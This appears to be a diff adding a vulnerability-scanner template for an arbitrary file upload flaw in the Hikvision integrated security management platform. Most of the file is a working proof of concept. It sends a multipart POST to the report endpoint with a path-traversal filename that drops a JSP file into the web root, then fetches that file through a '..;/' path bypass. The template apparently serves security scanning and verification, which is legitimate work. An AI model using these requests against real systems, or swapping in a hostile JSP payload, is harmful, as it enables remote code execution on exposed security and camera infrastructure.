@@ -1,0 +1,51 @@
+app: Hikvision
+query: app:"Hikvision"
+meta:
+  name: Hikvision report接口任意文件上传漏洞
+  level: 4
+  tags:
+  - file_upload
+  description: HiKVISION 综合安防管理平台 report接口存在任意文件上传漏洞，攻击者通过构造特殊的请求包可以上传任意文件，获取服务器权限。
+  homepage: ""
+  author: X prism
+  references: ""
+  solution: 升级至最新版
+  create_at: "2024-07-12 16:41:59"
+  available: false
+  steps:
+    variable: []
+    verify_steps:
+      type: and
+      verify:
+      - request:
+          method: POST
+          path: /svm/api/external/report
+          redirect: true
+          header:
+          - Content-Type: ' multipart/form-data; boundary=----WebKitFormBoundary9PggsiM755PLa54a'
+          params: |-
+            ------WebKitFormBoundary9PggsiM755PLa54a
+            Content-Disposition: form-data; name="file"; filename="../../../../../../../../../../../opt/hikvision/web/components/tomcat85linux64.1/webapps/eportal/new.jsp"
+            Content-Type: application/zip
+            <%out.print("test");%>
+            ------WebKitFormBoundary9PggsiM755PLa54a--
+        response:
+        - name: body
+          value: 上报的文件格式错误
+          type: contains
+      - request:
+          method: GET
+          path: /portal/ui/login/..;/..;/new.jsp
+          redirect: true
+          header: []
+          params: ""
+        response:
+        - name: body
+          value: test
+          type: contains
+    exploit_steps:
+      type: ""
+      params:
+        name: ""
+        type: input
+        value: ""
